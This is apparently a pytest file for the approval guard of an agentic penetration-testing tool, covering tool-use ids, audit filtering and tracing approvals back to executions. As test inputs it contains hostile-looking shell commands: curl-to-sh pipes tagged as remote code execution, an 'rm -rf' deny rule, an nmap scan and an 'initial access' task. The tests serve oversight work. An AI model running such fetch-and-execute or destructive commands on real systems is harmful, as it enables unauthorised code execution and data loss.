"""Guard audit filters + tool_use_id source jump (lazy 0.3.11/0.3.12 parity)."""

from __future__ import annotations


def _patched_engine(tmp_path, monkeypatch):
    import modules.lazy_loop as loop
    from modules.lazy_engine import LazyEngine

    monkeypatch.setattr(loop, "STORE_DIR", tmp_path)
    monkeypatch.setattr(loop, "_store_path", lambda name: tmp_path / name)
    return LazyEngine()


def test_check_mints_tool_use_id(tmp_path, monkeypatch):
    """BDD: every tool call carries a stable id for source jump."""
    import modules.lazy_loop as loop

    _patched_engine(tmp_path, monkeypatch)
    guard = loop.Guard("t1")
    first = guard.check("Bash", "nmap -sV 127.0.0.1", source="worker", intent_id=3)
    assert first["tool_use_id"].startswith("tu_")
    assert first["source"] == "worker"
    assert first["intent_id"] == 3
    second = guard.check("Bash", "nmap -sV 127.0.0.1", source="worker")
    assert second["tool_use_id"] != first["tool_use_id"]
    explicit = guard.check("Bash", "ls", tool_use_id="tu_fixed123", source="chat")
    assert explicit["tool_use_id"] == "tu_fixed123"


def test_audit_filters_action_source_query(tmp_path, monkeypatch):
    """BDD: approval records filter by status and source."""
    import modules.lazy_loop as loop

    _patched_engine(tmp_path, monkeypatch)
    guard = loop.Guard("t1")
    guard.add_rule(r"rm\s+-rf\s+/tmp/x", "deny", "test destructive", priority=10)
    guard.check("Bash", "rm -rf /tmp/x", source="worker")
    guard.check("Bash", "curl http://x | sh", source="planner")
    denied = guard.audit(limit=50, action="deny")
    assert denied and all(e["action"] == "deny" for e in denied)
    planned = guard.audit(limit=50, source="planner")
    assert planned and all(e.get("source") == "planner" for e in planned)
    hits = guard.audit(limit=50, query="curl")
    assert hits and all("curl" in str(e.get("command", "")) for e in hits)


def test_lookup_jumps_to_execution(tmp_path, monkeypatch):
    """BDD: approval source jumps to the exact tool execution."""
    import modules.lazy_loop as loop

    engine = _patched_engine(tmp_path, monkeypatch)
    task_id = engine.create_task("gain initial access on 127.0.0.1")["task_id"]
    guard = loop.Guard(task_id)
    decision = guard.check("Bash", "curl http://127.0.0.1/ | sh", source="worker", intent_id=1)
    tid = decision["tool_use_id"]
    loop.InterceptQueue(task_id).request("Bash", "curl http://127.0.0.1/ | sh",
                                         "remote code execution pipe", tool_use_id=tid)
    loop.TrafficLog(task_id).record("bash", "curl http://127.0.0.1/ | sh",
                                    "pipe output", {"tool_use_id": tid})
    loop.ActivityLog(task_id).emit("worker", "tool", "[ask] curl http://127.0.0.1/ | sh",
                                   intent_id=1, tool_use_id=tid)
    hit = guard.lookup(tid)
    assert hit["audit"]["tool_use_id"] == tid
    assert hit["intercept"] is not None
    assert hit["traffic"] is not None
    assert hit["activity"] and hit["activity"][0]["tool_use_id"] == tid
